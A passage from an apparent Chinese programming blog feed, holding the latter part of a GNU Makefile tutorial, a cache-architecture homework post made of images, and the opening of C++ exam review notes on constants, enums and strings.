main.out</code></pre></div></div><p>如果<code>make</code>后面什么都不跟，会默认只执行第一个任务。因此我们通常会在第一行定义一个依赖(习惯上叫做<code>all</code>)来使<code>makefile</code>在我们输入<code>make</code>时能够将所有需要的目标都构建出来。</p><p>可以试一下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-v3acb0lmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-v3acb0lmrh9u65"><pre><code class="hljs shell">(base) ➜ makegcc -o main.out main.c<span class="hljs-meta prompt_"># </span><span class="language-bash">make all</span></code></pre></div></div><p>和所预料的一样。</p><h3 id="make-规则">Make 规则</h3><p>可以看到，通过 <code>make</code>命令，能将上面的编译进行有效自动化管理。通过将从输入文件到输出文件的编译规则编写成Makefile 脚本，Make 工具将自动处理文件间依赖及是否需要编译的检测。</p><p>定义任务的基本语法为：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-hgyd66lmrh9u65"></i><span>makefile</span><div class="collapse show" id="collapse-hgyd66lmrh9u65"><pre><code class="hljs makefile">target [target2 ...]: [pre-req-1 pre-req-2 ...][command1 command2 ......]</code></pre></div></div><p>其中，</p><ul><li><code>target</code>为任务名或文件产出。从上面的例子可以看出，<code>target</code>可以是一个目标文件(如<code>main.out</code>)，也可以是一个执行文件，还可以是一个标签（如<code>all</code>，<code>clean</code>)等。</li><li><code>pre-req123...</code>这些是依赖项，即该任务所需要的外部输入，这些输入可以是已有的文件，也可以是其他任务产出的文件。</li><li><code>command</code> 为该任务具体需要执行的 shell 命令。</li></ul><p>因此简单的说，我们把想生成的文件或者想执行的命令名写到冒号前面，把生成的目标文件依赖文件写到冒号后面，下面<code>tab</code>对齐写想执行的命令就可以了。</p><h3 id="make是如何工作的">make是如何工作的</h3><p>现在来以输入<code>make</code>命令为例，简要分析make的工作过程。</p><p>首先在当前目录下找名字叫“makefile”的文件；</p><blockquote><p>事实上，执行make命令时，是按照GNUmakefile、makefile、Makefile的顺序依次尝试找到存在的文件并执行。</p></blockquote><p><code>make</code>执行第一条指令对应任务<code>all</code>；</p><p><code>all</code>发现其依赖<code>main.out</code>不存在，需要更新，转而去执行<code>main.out</code>对应的任务；</p><p><code>main.out</code>发现它所依赖的<code>main.c</code>不存在，需要更新，而且没有找到对应<code>main.c</code>任务，执行自己的<code>command</code>产生<code>main.c</code>；</p><p><code>main.out</code>执行完了，<code>all</code>继续执行自己的<code>command</code>把注释打印了出来。</p><h3 id="增量编译">增量编译</h3><p>其实上面说的还不是很严谨。准确的说，在执行任务时，它会先检查依赖项是否比需要产出的文件新，如果说依赖项更新(包括依赖项不存在)，则说明我们需要产出的目标文件属于过时的产物，需要重新生成。</p><p>什么意思。比如上面的示例，当执行</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-7zoou7lmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-7zoou7lmrh9u65"><pre><code class="hljs shell">(base) ➜ make main.out</code></pre></div></div><p>试图生成 <code>main.out</code> 产出时，会检查这个任务的依赖文件<code>main.c</code> 是否有修改过。</p><p>前面我们已经执行过该任务产生过<code>main.out</code>。再次执行时，会得到如下提示：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-25clq2lmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-25clq2lmrh9u65"><pre><code class="hljs shell">(base) ➜ make main.out make: Nothing to be done for 'main.out'.</code></pre></div></div><blockquote><p>有的版本的GNU make 提示的也可能是 make: 'main.out' is up to date.</p></blockquote><p>现在对输入文件 <code>main.c</code> 进行修改：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gpzizqlmrh9u65"></i><span>c++</span><div class="collapse show" id="collapse-gpzizqlmrh9u65"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{-     <span class="hljs-built_in">printf</span>(<span class="hljs-string">"hello world!"</span>);+     <span class="hljs-built_in">printf</span>(<span class="hljs-string">"hello ucore!"</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><p>再次执行 <code>make main.out</code>会发现任务正常执行并产生了新的输出，</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-22t1fulmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-22t1fulmrh9u65"><pre><code class="hljs shell">(base) ➜ make main.outgcc -o main.out main.c(base) ➜ ./main.outhello ucore!⏎</code></pre></div></div><p>这里 <code>main.c</code> 修改后，它在文件上来说，就比<code>main.out</code> 更新了，所以我们说 <code>main.out</code>这个目标， <strong>过时（out-dated）</strong> 了。</p><p>过时的任务才会被重新执行，而未过时的会跳过，并输出相应信息。</p><p>Makefile 天然实现了增量编译的效果，这是使用 Makefile进行自动化编译的最大的方便之处。在大型项目下会节省不少编译时间，因为它只编译过期的任务。</p><h3 id="phony-类型任务的执行">Phony 类型任务的执行</h3><p>上面提到，<code>target</code>既可以是文件名，也可以是标签，那么<code>make</code>怎么知道到底是指哪一种情况？有疑惑就对了。我们还是通过实验来验证这个问题：</p><p>还是使用一开始的示例，这次钻一个牛角尖：在这个目录下创建一个名叫<code>clean</code>的文件。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-62urdclmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-62urdclmrh9u65"><pre><code class="hljs shell">touch clean</code></pre></div></div><p>然后再<code>make clean</code>一下，我们会看到：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-qkdoorlmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-qkdoorlmrh9u65"><pre><code class="hljs shell">(base) ➜ make cleanmake: Nothing to be done for 'clean'.</code></pre></div></div><p>也就是说，<code>make</code>会将其优先视作文件。那么我们如果只是希望将其用作标签，那么应该如何解决呢？</p><p>Makefile中，有一个<code>.PHONY</code>指令。<a href="https://www.bilibili.com/video/BV1ih411e7gn/?spm_id_from=333.337.search-card.all.click&amp;vd_source=acb594007d0011f12244c20c5476e73d">Phony</a>的意思是伪造的，假的。可以理解为，在Makefile中，<code>.PHONY</code>后面的target表示的也是一个伪造的target,而不是真实存在的文件target。</p><p>因此，在头部加上一行<code>.PHONY: clean</code>就可以解决这样的二义性问题。</p><p>当然，即便不加<code>.PHONY</code>，将<code>target</code>用作标签(而不是对应于具体文件)的任务，逻辑上也属于phony类型的任务，只是有潜在的二义性罢了。phony类型的任务永远都属于过时类型，即，每次 <code>make</code>都会执行。因为这种类型的任务它没有文件产出，就无所谓检查，它的主体只是调用了另外的命令而以。</p><p>拿这里的 <code>all</code> 来说，当我们连续两次执行 <code>make</code>或 <code>make all</code> 时，得到：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-bv4a31lmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-bv4a31lmrh9u65"><pre><code class="hljs shell">(base) ➜ makegcc -o main.out main.c<span class="hljs-meta prompt_"># </span><span class="language-bash">make all</span>(base) ➜ make<span class="hljs-meta prompt_"># </span><span class="language-bash">make all</span></code></pre></div></div><p>可以看到，属于 phony 类型的任务 <code>all</code>每次都会执行其中定义的 <code>command</code>(在这里只是一行注释)，而非phony 类型的任务 <code>main.out</code> 则走了增量编译的逻辑。</p><h2 id="makefile-基本知识">Makefile 基本知识</h2><p>如果说通过上面的部分能够对<code>makefile</code>的工作方式和用途有了大概的理解，弄清楚下面的内容将能够看懂大部分<code>makefile</code>代码，并且尝试根据自己的实际情况添加或修改命令。</p><p>当然，如果要深入使用，还是离不开查阅文档。这里只是抛砖引玉，仅介绍部分最常用的语法和特性。</p><h3 id="变量宏">变量/宏</h3><p>Makefile 中可使用变量（宏）来让脚本更加灵活和减少冗余。</p><p>其中变量使用 <code>$</code>加圆括号或花括号的形式来使用，<code>$(VAR)</code>，定义时类似于 C中定义宏，所以变量也可叫 Makefile 中的宏，</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wt378dlmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-wt378dlmrh9u65"><pre><code class="hljs shell">CC=gcc</code></pre></div></div><p>这里定义 <code>CC</code> 表示 <code>gcc</code>编译工具。然后在后续编译命令中，就可以使用 <code>$(CC)</code> 代替<code>gcc</code> 来书写 shell 命令了。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-cio6xslmrh9u65"></i><span>makefile</span><div class="collapse show" id="collapse-cio6xslmrh9u65"><pre><code class="hljs makefile">+ CC=gcc<span class="hljs-section">all:main.out</span><span class="hljs-section">main.out: main.c</span>-gcc -o main.out main.c+<span class="hljs-variable">$(CC)</span> -o main.out main.c<span class="hljs-section">clean:</span>rm main.out</code></pre></div></div><p>这样做的好处是什么？因为编译工具可能随着平台或环境或需要编译的目标不同，而不同。比如<code>gcc</code> 只是用来编译 C 代码的，如果是 C++ 你可能要用<code>g++</code> 来编译。如果是编译 WebAssembly 则需要使用<code>emcc</code>。</p><p>无论怎样变，我们只需要修改定义在文件开头的 <code>CC</code>变量即可，无须修改其他地方。</p><h3 id="自动变量">自动变量</h3><p>自动变量是在编译规则匹配后工具进行设置的，具体包括：</p><ul><li><code>$@</code>：代表产出文件名</li><li><code>$*</code>：代表产出文件名不包括扩展名</li><li><code>$&lt;</code>：依赖项中第一个文件名</li><li><code>$^</code>：空格分隔的去重后的所有依赖项</li><li><code>$+</code>：同上，但没去重</li><li><code>$?</code>：同上，但只包含比产出更新的那些依赖</li></ul><p>这些变量都只有一个符号，区别于正常用字母命名的变量需要使用<code>$(VAL)</code> 的形式来使用，自动变量无需加括号。</p><p>利用自动变量，前面示例可改造成：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xjgw2dlmrh9u65"></i><span>makefile</span><div class="collapse show" id="collapse-xjgw2dlmrh9u65"><pre><code class="hljs makefile">CC=gccTARGET=main.out<span class="hljs-section">all:<span class="hljs-variable">$(TARGET)</span></span><span class="hljs-variable">$(TARGET)</span>: main.c<span class="hljs-variable">$(CC)</span> -o <span class="hljs-variable">$@</span> <span class="hljs-variable">$^</span><span class="hljs-section">clean:</span>rm <span class="hljs-variable">$(TARGET)</span></code></pre></div></div><p>减少了重复代码，更加易于维护，需要修改时，改动比较小。</p><p>自动变量特别是<code>$@</code>和<code>$^</code>在实际中用的比较多，建议熟记。</p><h3 id="vpath-vpath">VPATH &amp; vpath</h3><p>可通过 <code>VPATH</code> 指定依赖文件及产出文件的搜索目录。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-f5yktglmrh9u65"></i><span>makefile</span><div class="collapse show" id="collapse-f5yktglmrh9u65"><pre><code class="hljs makefile">VPATH = src <span class="hljs-keyword">include</span></code></pre></div></div><p>通过小写的 <code>vpath</code> 可指定具体的文件名及扩展名类型，</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2pi1u5lmrh9u65"></i><span>makefile</span><div class="collapse show" id="collapse-2pi1u5lmrh9u65"><pre><code class="hljs makefile"><span class="hljs-keyword">vpath</span> %.c src<span class="hljs-keyword">vpath</span> %.h <span class="hljs-keyword">include</span></code></pre></div></div><p>此处 <code>%</code> 表示文件名。</p><h3 id="依赖原则和匹配规则">依赖原则和匹配规则</h3><p>只定义了产出与依赖没包含任务命令的规则，我们常称为依赖规则。像下面这样：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-hvn1fllmrh9u65"></i><span>makefile</span><div class="collapse show" id="collapse-hvn1fllmrh9u65"><pre><code class="hljs makefile">Main.o : Main.h Test1.h Test2.hTest1.o : Test1.h Test2.hTest2.o : Test2.h</code></pre></div></div><p>这种规则可达到这种效果，即，右边任何文件有变更，左边的产出便成为过时的了。</p><p>区别于明确指定了产出与依赖，如果一条规则包含通配符，则称作匹配规则（PatternRules）。</p><p>比如，</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-4ql90mlmrh9u65"></i><span>makefile</span><div class="collapse show" id="collapse-4ql90mlmrh9u65"><pre><code class="hljs makefile"><span class="hljs-section">%.o: %.c</span>gcc -o <span class="hljs-variable">$@</span> <span class="hljs-variable">$^</span></code></pre></div></div><p>上面定义了这么一条编译规则，将所有匹配到的 c 文件编译成 Object产出。</p><p>有什么用？</p><p>这种规则一般不是直接调用的，是被其他它规则触间接使用。比如上面的依赖规则。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-tu9ie2lmrh9u65"></i><span>makefile</span><div class="collapse show" id="collapse-tu9ie2lmrh9u65"><pre><code class="hljs makefile">%.o : %.cppg++ -g -o <span class="hljs-variable">$@</span> -c <span class="hljs-variable">$&lt;</span>Main.o : Main.h Test1.h Test2.hTest1.o : Test1.h Test2.hTest2.o : Test2.h</code></pre></div></div><p>当右侧这些头文件有变动时，左边的产出会在 <code>make</code>时被检测到过时，于是会被执行。当执行时匹配规则 <code>%.o</code>会被匹配到，所以匹配规则里面的命令会执行，从而将 <code>cpp</code>文件编译成相应 Object文件。达到了依赖更新后批量更新产出的目的，而不需要写成这样：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-3r9upxlmrh9u65"></i><span>makefile</span><div class="collapse show" id="collapse-3r9upxlmrh9u65"><pre><code class="hljs makefile">Main.o : Main.h Test1.h Test2.h    g++ -g -o <span class="hljs-variable">$@</span> -c <span class="hljs-variable">$&lt;</span>Test1.o : Test1.h Test2.h    g++ -g -o <span class="hljs-variable">$@</span> -c <span class="hljs-variable">$&lt;</span>Test2.o : Test2.h    g++ -g -o <span class="hljs-variable">$@</span> -c <span class="hljs-variable">$&lt;</span></code></pre></div></div><h3 id="makefile-赋值">Makefile 赋值</h3><p><code>=</code> : <strong>最容易出错</strong> 的赋值等号</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-6ac983lmrh9u65"></i><span>makefile</span><div class="collapse show" id="collapse-6ac983lmrh9u65"><pre><code class="hljs makefile">VIR_A = AVIR_B = <span class="hljs-variable">$(VIR_A)</span> BVIR_A = AA</code></pre></div></div><p>最后<code>VIR_B</code>的值是<code>AA B</code>，而不是<code>A B</code>。在make时，会把整个makefile展开，最后决定变量的值</p><p><code>?=</code> : 如果没有被赋值过，则赋值等号后面的操作</p><p><code>+=</code> : 追加(append)</p><p><code>:=</code> : <strong>“正常”</strong> 的赋值</p><p>以一个小例子进行说明：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-r0kcthlmrh9u65"></i><span>makefile</span><div class="collapse show" id="collapse-r0kcthlmrh9u65"><pre><code class="hljs makefile"><span class="hljs-keyword">ifdef</span> DEFINE_VARVAR = “Hello World!”<span class="hljs-keyword">else</span><span class="hljs-keyword">endif</span><span class="hljs-keyword">ifeq</span> (<span class="hljs-variable">$(OPT)</span>,<span class="hljs-keyword">define</span>)VAR ?= “Hello World! First!”<span class="hljs-keyword">endif</span><span class="hljs-keyword">ifeq</span> (<span class="hljs-variable">$(OPT)</span>,add)VAR += “Kelly!”<span class="hljs-keyword">endif</span><span class="hljs-keyword">ifeq</span> (<span class="hljs-variable">$(OPT)</span>,recover)VAR := “Hello World! Again!”<span class="hljs-keyword">endif</span><span class="hljs-section">all:</span>@echo <span class="hljs-variable">$(VAR)</span></code></pre></div></div><p>测试这些命令：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-g1x0hclmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-g1x0hclmrh9u65"><pre><code class="hljs shell">(base) ➜ make DEFINE_VAR=true OPT=define“Hello World!”(base) ➜ make DEFINE_VAR=true OPT=add“Hello World!” “Kelly!”(base) ➜ make DEFINE_VAR=true OPT=recover“Hello World! Again!”(base) ➜ make DEFINE_VAR= OPT=define“Hello World! First!”(base) ➜ make DEFINE_VAR= OPT=add“Kelly!”(base) ➜ make DEFINE_VAR= OPT=recover“Hello World! Again!”</code></pre></div></div><h3 id="makefile-函数">Makefile 函数</h3><p>函数主要分为两类：make内嵌函数和用户自定义函数。对于 GNUmake内嵌的函数，直接引用就可以了；对于用户自定义的函数，要通过make的call函数来间接调用。</p><h4 id="内置函数">内置函数</h4><h5 id="通配符函数">通配符函数</h5><p>当我们想要对文件名进行通配时，可以采用通配符*或%来进行，如上所述。但只能将其用于规则目标或依赖以及<code>shell</code>命令中：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-pnqt9mlmrh9u65"></i><span>makefile</span><div class="collapse show" id="collapse-pnqt9mlmrh9u65"><pre><code class="hljs makefile"><span class="hljs-section">test: *.o</span>gcc -o <span class="hljs-variable">$@</span> <span class="hljs-variable">$^</span><span class="hljs-section">*.o: *.c    </span>gcc -c <span class="hljs-variable">$^</span></code></pre></div></div><p>但是其他情况比如如果我们想要获取某个目录下所有的C文件列表，可以使用扩展通配符函数<code>wildcard</code>：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-kd85fzlmrh9u65"></i><span>makefile</span><div class="collapse show" id="collapse-kd85fzlmrh9u65"><pre><code class="hljs makefile">SRC  = <span class="hljs-variable">$(<span class="hljs-built_in">wildcard</span> *.c)</span>HEAD = <span class="hljs-variable">$(<span class="hljs-built_in">wildcard</span> *.h)</span><span class="hljs-section">all:    </span>@echo <span class="hljs-string">"SRC = <span class="hljs-variable">$(SRC)</span>"</span>    @echo <span class="hljs-string">"HEAD = <span class="hljs-variable">$(HEAD)</span>"</span></code></pre></div></div><h5 id="文本处理函数">文本处理函数</h5><p>如果需要在makefile里进行文件名查找、替换、过滤等操作，则文本处理函数能够帮到忙。可以参阅<a href="https://www.zhaixue.cc/makefile/makefile-text-func.html">这个网站</a>的介绍。</p><h5 id="shell-函数">shell 函数</h5><p>用shell函数在<code>makefile</code>执行过程中使用shell命令。函数的参数就是命令，返回值是命令的执行结果。它和反引号`` 具有相同的功能。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-yixp77lmrh9u65"></i><span>makefile</span><div class="collapse show" id="collapse-yixp77lmrh9u65"><pre><code class="hljs makefile"><span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: all</span>current_path = <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> pwd)</span><span class="hljs-section">all:    </span>@echo <span class="hljs-string">"current_path = <span class="hljs-variable">$(current_path)</span>"</span></code></pre></div></div><h5 id="addprefix">addprefix</h5><p>格式：$(addprefix <code>prefix</code>,<code>&lt;names...&gt;</code>)功能：为文件序列添加前缀</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-oy5q8almrh9u65"></i><span>makefile</span><div class="collapse show" id="collapse-oy5q8almrh9u65"><pre><code class="hljs makefile">Variable := <span class="hljs-variable">$(<span class="hljs-built_in">addprefix</span> src/,foo bar)</span><span class="hljs-comment"># Variable ==&gt; src/foo src/bar</span></code></pre></div></div><h5 id="addsuffix">addsuffix</h5><p>格式：$(addsuffix<code>addsuffix</code>,<code>&lt;names...&gt;</code>)功能：为文件序列添加后缀</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-org51olmrh9u65"></i><span>gams</span><div class="collapse show" id="collapse-org51olmrh9u65"><pre><code class="hljs gams"><span class="hljs-keyword">Variable</span> := $(addsuffix <span class="hljs-comment">.c,foo bar)</span># <span class="hljs-keyword">Variable</span> <span class="hljs-comment">==&gt; foo.c bar.c</span></code></pre></div></div><h5 id="basename">basename</h5><p>格式：$(basename <code>&lt;names...&gt;</code>)功能：从文件名序列中取出各个文件名的前缀部分（除去扩展名后的剩余部分）</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-f4ne7olmrh9u65"></i><span>gams</span><div class="collapse show" id="collapse-f4ne7olmrh9u65"><pre><code class="hljs gams"><span class="hljs-keyword">Variable</span> := $(basename <span class="hljs-comment">src</span>/foo.c src<span class="hljs-number">-1.0</span>/<span class="hljs-comment">bar.c hacks)</span># <span class="hljs-keyword">Variable</span> <span class="hljs-comment">==&gt; src</span>/foo src<span class="hljs-number">-1.0</span>/<span class="hljs-comment">bar hacks</span></code></pre></div></div><h4 id="用户自定义函数">用户自定义函数</h4><p>GNUmake提供了大量的内嵌函数，大大方便了makefile编写。但根据需要，我们也需要自定义一些函数，然后在makefile中引用它们：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-bae8cklmrh9u65"></i><span>makefile</span><div class="collapse show" id="collapse-bae8cklmrh9u65"><pre><code class="hljs makefile"><span class="hljs-section">PHONY: all</span><span class="hljs-keyword">define</span> func    @echo <span class="hljs-string">"pram1 = $(0)"</span>    @echo <span class="hljs-string">"pram2 = $(1)"</span><span class="hljs-keyword">endef</span><span class="hljs-section">all:    </span><span class="hljs-variable">$(<span class="hljs-built_in">call</span> func, hello zhaixue.cc)</span></code></pre></div></div><p>用户自定义函以define开头，endef结束，给函数传递的参数在函数中使用$(0)、$(1)引用，分别表示第1个参数、第2个参数…调用时要使用call函数间接调用，各个参数之间使用空格隔开。</p><h2 id="参考链接">参考链接</h2><p>如果希望进行更深入的了解可以参阅：</p><p><a href="https://www.gnu.org/software/make/">GNU make官网</a></p><p><a href="https://www3.ntu.edu.sg/home/ehchua/programming/cpp/gcc_make.html#zz-2.">GCCand Make Compiling, Linking and Building C/C++ Applications</a></p><p>以及中文教程：</p><p><a href="https://seisman.github.io/how-to-write-makefile/index.html">跟我一起写Makefile</a></p>]]></content>
    
    
    <categories>
      
      <category>小寄巧</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>体系结构-cache</title>
    <link href="/posts/64660/"/>
    <url>/posts/64660/</url>
    
    <content type="html"><![CDATA[<h1 id="体系结构-cache经典题目">体系结构-cache经典题目</h1><p>这是计算机体系结构的课后习题。通过逆向的思维更深的理解了cache的结构和cache优化的方向，是一道挺有意思的题。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-cache/20230828210608104356_209_20221107220133912940_232_image-20221107215520312.png" alt="image-20221107215520312"><figcaption aria-hidden="true">image-20221107215520312</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-cache/20230828210609246535_910_20221107135836770239_118_BDE01ED506906D92EDDFF59FB5BA32D9.jpg" alt="BDE01ED506906D92EDDFF59FB5BA32D9"><figcaption aria-hidden="true">BDE01ED506906D92EDDFF59FB5BA32D9</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-cache/20230828210610253001_340_20221110201157288967_934_image-20221110201142068.png" alt="image-20221110201142068"><figcaption aria-hidden="true">image-20221110201142068</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-cache/20230828210611676607_892_20221107220136090940_467_image-20221107220004897.png" alt="image-20221107220004897"><figcaption aria-hidden="true">image-20221107220004897</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-cache/20230828210615742399_967_20221107135841382575_356_74966D2A3FF6BD074F7A29C5CF3A4832.jpg" alt="74966D2A3FF6BD074F7A29C5CF3A4832"><figcaption aria-hidden="true">74966D2A3FF6BD074F7A29C5CF3A4832</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-cache/20230828210616762312_293_20221107135842709137_738_36197BA4AFEF78EF89A0D8635CBFBEF7.jpg" alt="36197BA4AFEF78EF89A0D8635CBFBEF7"><figcaption aria-hidden="true">36197BA4AFEF78EF89A0D8635CBFBEF7</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-cache/20230828210617754462_770_20221107135844032615_523_A025FDFE253E78CE2CDB8743D58DD963.jpg" alt="A025FDFE253E78CE2CDB8743D58DD963"><figcaption aria-hidden="true">A025FDFE253E78CE2CDB8743D58DD963</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-cache/20230828210618730028_158_20221107220140271744_579_image-20221107220103032.png" alt="image-20221107220103032"><figcaption aria-hidden="true">image-20221107220103032</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-cache/20230828210620264457_180_20221107135848168421_297_5C5A1A71E12687C41E251DEF29A3AE6B.jpg" alt="8D44BC68FBC1F5D2361F564FDEC15B81"><figcaption aria-hidden="true">8D44BC68FBC1F5D2361F564FDEC15B81</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>体系结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>高级语言程序设计2-1笔试复习</title>
    <link href="/posts/64911/"/>
    <url>/posts/64911/</url>
    
    <content type="html"><![CDATA[<h1 id="高级语言程序设计2-1笔试复习">高级语言程序设计2-1笔试复习</h1><div class="note note-info">注：此系列内容仅供应对C++程序设计基础笔试使用。</div><h3 id="认识c">认识C++</h3><h4 id="基本概念和词汇">基本概念和词汇</h4><p>main不是C++中的保留字。因此<code>int main;</code>在C++中合法。</p><div class="note note-secondary">下列哪个是C++语言的合法的字符常量 "0" '054’ ‘' ‘\092’</div><blockquote><p>A选项，双引号表示的是字符串常量；B选项054表示八进制整数，但是缺少转义符号；D选项是将其后的整数092表示八进制整数，但是八进制不存在9这个数。注意，单引号表示的字符常量，可以是整数，但必须带有转义符号，其字符常量为整数表示的ASC码对应的字符</p></blockquote><p>一个经常设坑的点：八进制表达中出现8或9</p><h4 id="枚举常量">枚举常量</h4><p><code>enum t1 {a1,a2=7,a3,a4=15}time;</code></p><p>则枚举常量<code>a1</code>和<code>a3</code>的值分别是0和8</p><p>枚举值对应的整数值可以是任意整数。</p><p>注意区分枚举类型定义和枚举类型变量定义。前者定义的数据类型，后者是定义变量。定义类型名时不应该有=</p><div class="note note-warning">因此 enum a=[one,two,three);是不对的</div><p>还可以这样写</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-r4q5splmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-r4q5splmrh9u6a"><pre><code class="hljs c++"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">team</span>{my, your=<span class="hljs-number">4</span>, his, her=his+<span class="hljs-number">10</span>};cout&lt;&lt;my&lt;&lt;<span class="hljs-string">' '</span>&lt;&lt;your&lt;&lt;<span class="hljs-string">' '</span>&lt;&lt;his&lt;&lt;<span class="hljs-string">' '</span>&lt;&lt;her&lt;&lt;endl;</code></pre></div></div><p>结果<code>0 4 5 15</code></p><h4 id="string">string</h4><p>关于字符串类型</p><p>使用<code>.length()</code>和<code>strlen()</code>时计算的字符串长度都不包含<code>\0</code></p><div class="note note-warning">注意:+不支持两个字符串字面常量的连接,如 string word4 "hello"+"world!";</div><h3 id="运算符和表达式">运算符和表达式</h3><h4 id="基本概念">基本概念</h4><p>在学习了编译原理之后，对这些概念以及对应的“奇特”写法应当已经见怪不怪。但为应对考试，仍记录以备复习。</p><h5 id="表达式">表达式</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A12-1%E7%AC%94%E8%AF%95%E5%A4%8D%E4%B9%A0/20230828210004010046_264_20221027094522795684_122_image-20221013141835992.png" alt="image-20221013141835992"><figcaption aria-hidden="true">image-20221013141835992</figcaption></figure><p>注意，“表达式”不带分号，带了分号就是语句。</p><h4 id="优先级和结合性">优先级和结合性</h4><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ax099ulmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-ax099ulmrh9u6a"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{    <span class="hljs-comment">//test 1</span>    <span class="hljs-type">int</span> k, a, b, c;    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> w = <span class="hljs-number">5</span>;    <span class="hljs-type">double</span> x = <span class="hljs-number">1.42</span>;<span class="hljs-comment">//    x%(-3); 